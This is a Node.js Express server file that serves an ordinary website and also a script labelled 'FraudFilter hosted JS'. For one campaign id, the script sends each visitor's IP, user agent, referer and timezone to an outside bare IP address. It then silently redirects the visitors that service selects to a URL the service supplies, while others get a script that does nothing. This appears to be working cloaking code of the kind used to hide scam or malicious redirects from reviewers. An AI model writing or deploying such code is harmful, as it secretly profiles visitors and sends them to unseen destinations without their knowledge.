const express = require("express");
const path = require("path");

const app = express();

app.set("trust proxy", true);

const PORT = process.env.PORT || 3000;

const FRAUDFILTER_HOST = "http://130.211.20.155";
const FRAUDFILTER_TOKEN = process.env.FRAUDFILTER_HOSTED_JS_TOKEN;

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];

  if (forwarded) {
    return forwarded.split(",")[0].trim();
  }

  return req.ip || req.socket.remoteAddress || "";
}

function safeJavascript() {
  return `
(function(){
  try {
    return;
  } catch(e) {}
})();
`;
}

function redirectJavascript(target) {
  const safeTarget = JSON.stringify(target);

  return `
(function(){
  try {
    window.location.replace(${safeTarget});
  } catch(e) {
    window.location.href=${safeTarget};
  }
})();
`;
}

// FraudFilter hosted JS
app.get("/", async (req, res) => {
  const campaignId = req.query.id;

  if (campaignId !== "vqu7l") {
    return res.type("application/javascript").send(safeJavascript());
  }

  /*
   * FraudFilter timezone bootstrap.
   * The generated PHP endpoint first obtains the browser
   * timezone offset before making the router request.
   */
  if (!req.query.tzzz) {
    const currentScript =
      "https://deskpulse-c28e5849a14d.herokuapp.com/?id=vqu7l";

    const bootstrap = `
(function(){
  try {
    var s = document.currentScript;
    var src = s && s.src ? s.src : ${JSON.stringify(currentScript)};
    var u = new URL(src, window.location.href);

    u.searchParams.set("id", "vqu7l");
    u.searchParams.set("tzzzr", "0");
    u.searchParams.set("tzzz", String(-new Date().getTimezoneOffset()));

    var n = document.createElement("script");
    n.src = u.toString();

    if (s && s.parentNode) {
      s.parentNode.insertBefore(n, s.nextSibling);
    } else {
      document.head.appendChild(n);
    }
  } catch(e) {}
})();
`;

    return res.type("application/javascript").send(bootstrap);
  }

  try {
    const clientIp = getClientIp(req);

    const headers = {
      "Content-Length": "0",
      "X-FF-JS-TOKEN": FRAUDFILTER_TOKEN || "",
      "X-FF-REMOTE-ADDR": clientIp,
      "X-FF-X-FORWARDED-FOR":
        req.headers["x-forwarded-for"] || clientIp,
      "X-FF-REFERER":
        req.headers["referer"] || "",
      "X-FF-HOST":
        req.headers.host || "",
      "X-FF-QUERY-STRING":
        req.originalUrl.split("?")[1] || "",
      "X-FF-REQUEST-URI":
        req.path || "/",
      "User-Agent":
        req.headers["user-agent"] || "",
      "Expected":
        req.headers["expected"] || "",
      "X-FF-TZ-OFFSET":
        req.query.tzzz
    };

    if (req.headers["cf-connecting-ip"]) {
      headers["X-FF-CF-CONNECTING-IP"] =
        req.headers["cf-connecting-ip"];
    }

    if (req.headers["x-real-ip"]) {
      headers["X-FF-X-REAL-IP"] =
        req.headers["x-real-ip"];
    }

    const response = await fetch(
      `${FRAUDFILTER_HOST}/${campaignId}`,
      {
        method: "POST",
        headers
      }
    );

    const output = await response.text();

    console.log("FraudFilter HTTP status:", response.status);
    console.log("FraudFilter response:", output);

    const parts = output.trim().split(";", 3);

    const result = parts[0] || "0";
    const target = parts[2] || "";

    console.log("FraudFilter result:", result);
    console.log("FraudFilter target:", target);

    res.type("application/javascript");

    if (result === "1" && target) {
      return res.send(redirectJavascript(target));
    }

    return res.send(safeJavascript());

  } catch (error) {
    console.error("FraudFilter error:", error);

    return res
      .type("application/javascript")
      .send(safeJavascript());
  }
});

// Serve the website
app.use(express.static(path.join(__dirname, "dist")));

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
